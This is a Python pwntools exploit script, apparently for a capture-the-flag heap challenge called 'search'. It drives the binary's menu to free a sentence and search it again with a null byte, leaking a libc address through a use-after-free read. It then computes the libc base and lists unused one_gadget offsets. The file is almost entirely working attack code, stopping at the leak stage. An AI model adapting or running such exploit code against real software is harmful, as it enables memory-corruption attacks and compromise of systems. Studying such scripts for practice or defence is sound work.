from pwn import *
context(
	log_level='debug',
	binary='./search'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendline(str(func))

def search(content,flag):
	menu(1)
	io.sendlineafter('Enter the word size:',str(len(content)))
	io.sendafter('word:',str(content))
	if flag != '':
		io.sendlineafter('Delete this sentence (y/n)?',str(flag))

def sen(content):
	menu(2)
	io.sendlineafter('sentence size:',str(len(content)))
	io.sendafter('sentence:',str(content))


#=========================================
#VAR
leak_libc_off = 3951480
one_gadget=[283158,283242,983716,987463]
ptr = 0x6020B8
#=========================================

sen('a'*0x80 + ' j ')
search('j','y')
search('\x00','n')
io.recvuntil(': ')
libc_leak = u64(io.recv(6).ljust(8,'\x00'))
success('libc_leak: ' + hex(libc_leak))

libc.address = libc_leak - leak_libc_off
success('libc.address: ' + hex(libc.address))
# dbg()

io.interactive()
